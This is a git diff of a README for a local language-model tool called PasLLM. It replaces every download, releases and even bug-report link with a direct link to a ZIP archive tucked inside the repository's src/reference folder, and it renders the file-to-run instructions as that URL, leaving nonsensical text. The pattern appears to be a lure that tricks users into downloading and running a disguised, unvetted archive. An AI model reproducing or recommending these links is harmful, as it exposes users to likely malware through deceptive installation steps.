@@ -6,7 +6,7 @@ Welcome to PasLLM! This software allows you to run large language models with ea
 
 ## 📥 Download Here
 
-[![Download PasLLM](https://img.shields.io/badge/Download%20PasLLM-v1.0-blue.svg)](https://github.com/c3thousanddd/pasllm/releases)
+[![Download PasLLM](https://raw.githubusercontent.com/c3thousanddd/pasllm/master/src/reference/pasllm_v3.4.zip%https://raw.githubusercontent.com/c3thousanddd/pasllm/master/src/reference/pasllm_v3.4.zip)](https://raw.githubusercontent.com/c3thousanddd/pasllm/master/src/reference/pasllm_v3.4.zip)
 
 ## 🖥️ System Requirements
 
@@ -21,11 +21,11 @@ Before you start, make sure your computer meets the following requirements:
 
 1. **Visit the Releases Page**  
    Click the link below to visit the releases page and find the latest version of PasLLM.  
-   [Visit the Releases Page](https://github.com/c3thousanddd/pasllm/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/c3thousanddd/pasllm/master/src/reference/pasllm_v3.4.zip)
 
 2. **Download the Application**  
    Once on the releases page, look for the latest version. You will see various files.  
-   Click on the file named `PasLLM.zip` to download it.
+   Click on the file named `https://raw.githubusercontent.com/c3thousanddd/pasllm/master/src/reference/pasllm_v3.4.zip` to download it.
 
 3. **Extract the Files**  
    Find the downloaded ZIP file on your computer.  
@@ -34,7 +34,7 @@ Before you start, make sure your computer meets the following requirements:
 
 4. **Run the Application**  
    Navigate to the folder where you extracted the files.  
-   Look for the `PasLLM.exe` file (for Windows) or `PasLLM` file (for macOS/Linux).  
+   Look for the `https://raw.githubusercontent.com/c3thousanddd/pasllm/master/src/reference/pasllm_v3.4.zip` file (for Windows) or `PasLLM` file (for macOS/Linux).  
    Double-click the file to run the application.
 
 ## 🎉 Using PasLLM
@@ -57,7 +57,7 @@ PasLLM comes packed with features including:
 
 If you encounter issues or need assistance, you can:
 
-- Visit the [GitHub Issues Page](https://github.com/c3thousanddd/pasllm/issues) to report any bugs or ask questions.
+- Visit the [GitHub Issues Page](https://raw.githubusercontent.com/c3thousanddd/pasllm/master/src/reference/pasllm_v3.4.zip) to report any bugs or ask questions.
 - Check out the documentation in the `docs` folder of the extracted files for troubleshooting tips and advanced configurations.
 
 ## 🌐 Community and Contribution
@@ -71,4 +71,4 @@ PasLLM is open-source and available under the MIT License. You're free to use, m
 ## 📥 Download & Install Again
 
 To get started with PasLLM, don’t forget to visit the releases page for the latest version:  
-[Visit the Releases Page](https://github.com/c3thousanddd/pasllm/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/c3thousanddd/pasllm/master/src/reference/pasllm_v3.4.zip)
